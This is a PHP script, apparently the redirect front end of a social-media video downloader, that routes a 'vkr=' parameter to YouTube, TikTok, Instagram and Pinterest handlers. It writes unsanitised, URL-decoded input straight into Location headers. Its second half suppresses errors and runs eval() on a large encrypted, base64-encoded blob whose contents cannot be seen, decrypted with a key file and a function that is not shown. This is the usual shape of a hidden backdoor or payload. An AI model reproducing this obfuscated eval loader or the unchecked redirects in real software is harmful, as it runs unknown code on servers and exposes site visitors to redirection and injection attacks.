<?php 
error_reporting(0);
$urlx = $_SERVER['REQUEST_URI'];
$video_id = explode("vkr=", $urlx);
$video_id = $video_id[1];
include("config.php");
$lloc = urldecode($video_id);
$llocf = urlencode($video_id);
preg_match("/^(?:http(?:s)?:\/\/)?(?:www\.)?(?:m\.)?(?:youtu\.be\/|youtube\.com\/(?:(?:watch)?\?(?:.*&)?v(?:i)?=|(?:embed|v|vi|shorts|user)\/))([^\?&\"'>]+)/", $lloc, $match);
preg_match("~/pin/(?:t\.\d+/)?(\d+)~i", $lloc, $matches);
$id = $matches[1];
if(!empty($match[1])){
   header("Location: $domain/dl/yt.php/?vkr=https://www.youtube.com/watch?v=$match[1]"); 
}
elseif(stripos($lloc,'pinterest')==true)  {
    header("Location: $domain/dl/?vkr=https://pinterest.com/pin/$id");
}
elseif(stripos($lloc,'gs@')==true)  {
    header("Location: $domain/dl/igs.php/?vkr=$lloc");
exit();
  }  
    elseif(stripos($lloc,'gh@')==true)  {
    header("Location: $domain/dl/igh.php/?vkr=$lloc");
exit();
  } 
 elseif(stripos($lloc,'tm@')==true)  {
    header("Location: $domain/dl/ytm.php/?vkr=$lloc");
exit();
  }
elseif(stripos($lloc,'tiktok')==true)  {
    header("Location: $domain/dl/tiktok.php/?vkr=$lloc");
}
elseif(stripos($lloc,'/reel/')==true)  {
    header("Location: $domain/dl/?vkr=$lloc");
}
elseif(stripos($lloc,'insta')==true)  {
    header("Location: $domain/dl/insta.php/?vkr=$lloc");
}
elseif(stripos($lloc,'//')==true)  {
    header("Location: $domain/dl/?vkr=$lloc");
exit();
  }  
   else
    header("Location: $domain/dl/search.php/?vkr=$lloc");


  //error_reporting(0);
if(!function_exists('openssl_decrypt')){die('<h2>Function openssl_decrypt() not found !</h2>');}
if(!defined('_FILE_')){define("_FILE_",getcwd().DIRECTORY_SEPARATOR.basename($_SERVER['PHP_SELF']),false);}
if(!defined('_DIR_')){define("_DIR_",getcwd(),false);}
if(file_exists('key.php')){include_once('key.php');}else{die('<h2>File key.php not found !</h2>');}
$e7091="d3h1eHJJN0Z6aWZBc3Byb1ZBNXhmTzBlL3dGUVhKZUIwdys1WHlaLys4Y0diNUtuZit3MDJ3WTgzNHRUYmwxRjlUTzJDczdaZ1dsZWpIVWdRNElnd3hFK20yenBrVWpaZHVkWGJYcHJIdHF2ckN2aDBxaFdqN3F6NWpNTk1vMWJpV3AwSkZRUlNVNnpWTnZXV3pJNVVCdUNKeXZNSU4xcjRVbFNLZC9FZ0pvbzYraUw3WnpHZHdpQmV2MFZZaTRGVmVGbkJabHhNWWdIQW93Ujdqa09MT3h1Z1h2RkM5NWRqUHZkdmQ1Y3p1OHU2d1VndTFqeFhPdG5YMXVOZU5Pby9iaWlUUVc1eExsS2xaWlN1S1FxdHpjcnlmN0o1WkVkQ00xKzQyOFdKK05NZjJQdmtSS3FadmFmV2F0b2tqVXp5Z20rOFFZSWg0cWtISUhnM0I2TWh4b1A5RGpkRTNUM1VQVER0NUgzQ0MzQ0IvcTBMTGxONnUyamFlQlZWMm1jb09VMmNYcVMzVDVGazB6d0tVVFovZmxqSHlYVXlPcWZGTGtUU1hQWDV6K2VBajJTeFhHZ2tLT2MxMCthRzJMZ1NsaGhiQThTczFYRGhYc3F4bkFmQlV1NXRTYkphVWtrcFhCTUZPQ29MMmQzbVFSV1hra0NrcU9aaGRDcWRYN2RxcEdHc3VUdjltNUV1bHJaVXlQZ2l2YXh1NmRiaXlXODlvR1YrQVQvUzMxdjdJdG5EQWdFeVliUXo5bXRVTUhjOVhhT3lkMURWUWhZZ1hkTzRmdEc0blR2ekt0V3BKSFpjNG4rN0gzMzFFL2hEWkx6ODJNa0dCVXZJRTJrZG1jUDRUazZxbk14VXlnRzNEeTdqc1doQkh4dk83OHB6MWUxYXI0d3J2UDE5TkVCM2ZXd1prSGhLYzZqUzZWY3p5SEthcVpPWnBYaXEvSlQxVGlXMDliVE11NXI4eEVuY3FTY2psV2d5ZjA1NVBueFluWW5mc1JBaGZiR1d5cnVLSTJ3NzhMRnQ3NUxUcWRaVElMYURldnF5RFZGa09GR2ljSEpac3B3WG53M1VwbUJBcnZrZ21yeG53M0VHVnN4UHcrZ2x2WXk0ZHlzdDRNd2lvUEZGT2F6RW10RUNVODNOM2Y2Q3Jad1lxa2JkSjNsNXc4RXFqazArUVZYeGlMOVZydkszYndJUnFyeXVwQUc4SHlNMVpGOEw4YTdzTGR5cXRpTnlHblplbVR1K1BZVXFxZEM1YkJOZGFvOFpwTTFTd0dQVElZOTIzNjI3ZXNmYSt3N1YvOExqNzhvbE9rd0lLWDVzNjI2V0Q0Y3Y3THdnSUZ4Y3JuWU1ybjAvVE5DTVBCcFdEZ1pRejMzTUZtSENHclByVDh5LzRHamRzQmtaci8zU2tabmVzempNWitIWXBmQUVCZFZhOTlIOW9keVpiZE1DVklTcENJSFB6TWF5ZmcxUUhyTHVRRlNqT0plT0pDVWwvWVFQMmtCNDZIcGoxdmUwSkxFYXR4UVFGZlc3eDUwNW80SHpXUkk5d2hoZExmNDNhNW11L0Uxb2FwOVNiQnVVYjBqbndrVUtpZitVOEd2b2hmWDJqVDRyU0ExL0x6RDBXbS9DOHVydk12dGFoc3N2N2ZDdWxCRkFucGE2dzhDUExWWVpVN3NhZzdLWHZLaTZiZGI3N3dQdGRQdmszWmJRODE2ZksxeCtnMmpNbW1rNm12K2w3T1dXZGdXV0lRSVpZK0w5Y1c3TTkzakp3UU1oci9UZFhzR1NYb2RoWU1TbTRVcDFhNUFjRWgwL0lVMm9JMGFlMFhzcGp5Y2FRVWQ4eW05bUpxNEJVTm1lUzJIUmVZbFpBQWJacHJDYWtMY0hBVWhLUnpDanVPYmpnSWhuZHVHb3FjclQvTytCbjhHZldSRXVLWFA2RG1wSHhCTGJMMmhWYTUxOG5JbW9ldVo1NWJpQ1pzNzNsTzE2N25qTTk3dEEzMFVCQm1EWEt3KzAycFhzTU12a0cwZGRwY1l3SXh2aUcyYXdNUTlmNERhZWVlbjR2elVzNGR0aUp6RWZXeU13ZHYwL0FsMDA2QlBPdjZGaWRqQk0vY2dzdnVDTS9QV1ltdE9rRVBnc3cwRzJ5WXhEWUNsY0hyRXZMOStPNWR4NXVYQWsycklrWGZlNVovdWpSeGFZWUR0NDdoTlgxMHFmbGZBSGJsT0UvME8wSkx4bks3NnE3OGxhM0lSVGRtWUZUZVcrM3daS0NENUJnLzUwVGhQa0Jsb1MyMHppQ1FxMjQyZnNTcDA3aktmOSsvOG5TU2pFQlFYYWUvWGw3M1NTVzdFb1R6cUFwK25DY3gySVJFa3FNVTVJK1FVYVo5dlI5cDVWa3JDbUpiU1RScGYyMm9pbFZ1aTlNeE04SE10MXNLYlZaVmZTeDV2blYzRlljVEg4MDg2ZDZ0VC85WEtLYTYzenNaQzRLWFVlVGlFUFVVcmVQZ0hJaXB5VzZReHMyQlJNRHRwOXNWOVJES1l6UTVHWlUyTHBDSFBiQ0Z0Q1B3V2V1RnYxOHV0MnJsZXhMYmhnUWk4NmZWQnoxeFJKd1IwbDdOMWdPME1PWkdSTDFCdkY2VnZZbHVNVnNoUHVEK0ttVHlyRHpTNjFURCtBT3QxNjdDc0dVSHVsV3lzam9vSDIwNERNWWtWWHNoV0JqS0xOQm5SVXRRcXdtbmVQbWV2RzVERVhkdGJ6ZW4wYzB0d29qUTJWNlozVlBxMjBqMHJQL1dZelFhamt3dFJlaGt6d3pMWXhBMUIvNEpQMzIva1FjN1BKWXlDSjAvMjFnTUYrU0xuUFJJL1dHaU4rL3M2WXVBOEFOMmVBcXRSY3BjM1g0V1VBZ0JYemV0U0RvUHRxQ2IwS0xmdDd0ZjB0bitBTmpVWncyU0xNQ0N3UUtFYVM3Um1KaUZLKzljTVZwdFROZnk1VllFUGxUTm00eHA3UXBpYk9ZNm1SUmdoQVR4MllSaFIzS2lhUGZnN1M2azYrYW5rZlNrdm5BMWpFenNGaGhxSkhMcHVaVndwR1p4TnNGNFhxOVJPa0FZdCtXOGIzMHlLWWYzOWZ6bnptRGgwSG1VUXFvbGNHRitDK2NpdklFQnB6NDRhREZnSUtwRVNrK0NSVmFYZWhWeEtYYTB2cVF6ZkRPWWNoN2NmMnNKcTN0akZJVllsREtNakxwZ21oM1E4aWE1d2VBZUhxTjdBbldqTlRVR2RaZ1Z3WDk5eWZPUkJiaGU4T29WZVRZV2RxQTFERDJSdVJCMlVNQUswbTRPUjFVRXlRMzZadnFrb1Rmajdoa2R2N29kcUE2bDdjc29FR3lVdFI2MjVlQ0FNb0g5WGNpcVhGTk9hMG5XWlZjTEZRcmwxekoxMmhKKzJXdXVJSWdQbHh5RDVRTVdpUnpOWEs2OG9EUzc0USt6N2Y0SGJRL3ljNWxLQkJZN20ydS9vT3hmanN0ZE5MR2k3WVlGVTR6dUJjREJqQ1dQK0laSXhRbzFDV2NyRm11YlZSVHVGNW4veExNSis4ckd6RVMwUDNQOHlOK0xmY3VjQmNZODhJN0ltbEJKQmFIVkRxVTZucXRmVDFmMDg3UWFFYzg0Y04vUTBPVXZ2ajJhMFNMZzRzQnBuVmx1U1hUSFpDcXlsaFp2VmF0bit0Zys2dm9KeWJhUW1DcHBORy9FUXlIaUYxNTB1WUo5dERXMkJIVUFKWk5CZWN5UCtsTUdCcVR1bjJ0aklWU0JWU29XTHhzb3Z4REMwLzM5c3MyOTFMNTVTd0thZDlFWGx4NWh6YkZ3UnUwWUNUZGhPdmJnVnBrcXhYdFRjVVBibCtMc0hwUHJNU1hqM0oraTZiamQrK21EaXVUMSt4dzBkYlplZE1SQ0ZTOSs2eVF0dWxZV1UxK3F0OTl2TlZzcDE4N0x2NzBabVhRTjd0eHNObnVac3BWVzArQTlGejZkcDlFOUQ4dTNxVmk2bXhBdWg3QUtsZEpXcXBtd3pmWjJXYnZDUk9ZeVJxR1Yzc2VNbTI3akQ4VUc5dFhFQkxRYkszYnZ2dklCdXZFd3pYN3VNUXBYMzlZRVhmUk1Kb1BPL000ZnA2Rmg0YU45L1BNTTdsdXhJRlRxd3h2NnlwL0l2dGJMeW80dm52TklnSTdLYkRoNEFwcDdHYzc0c2luVFM5QmJnS21nV2VjaHpPUWpnY1pRN0VINDdTa3NKczBrNlJiMVIzbC85SUtrSTZ6UWRWelBKaTFDZUxUSHovY0pjZitnVWV3T2w3blIzM1JhUm80dnZLdE1DVWU1VENvVGRiaFErZ2NpZXhtNHFNeURjUHJEZmsvTnNBNDNZaXhHQXhGLy83K25rT0lzQSs0ZS9xeWN0aW1ZYlhyZ2Rvc2VyZjU5N0Z6SG9yR3ZtczdOczdkSDZuTHRSWnBhMG1kVVFETEY0ZFlLK1VVOENsL3ptLzBJY09wdHJwNExyQzR5QmdwU2hhMTI2TTlydm4rYmV3OThZOHpwdlhnMFAwVVBlR1dyZmxqWFh5bDNzQTFYeDhaVFMvb1B0ZTY0bVNGTWJIeWplWXpQclVFV2ZiNFdocHQ4NG9Ra3E1ZWpkbnJwa3IzbjE1Y2lmUVdOTUJrQUJXVDA1KzJvMkNzZy9SZmZlRTRTOTZRU1FvbVpkZHZsNVdoM2FEeWFOYUp6NGNIYmovMUlPZU9vVmJRUm4rdlNBdmZXUHdWK2JFZVZHQlVIQk8vd2VPUGNEZEpnWXdoVW9yOVVkNEpLOGpBbGF6TEwvbUtEby9MUHVDMlYwMFFzQUtMUFlLYU51clVONDhBWDNjdklqcHJUZUpsTXFYK2pDdzZacjFpcEIyRkVO";eval(e7061($e7091));

?>
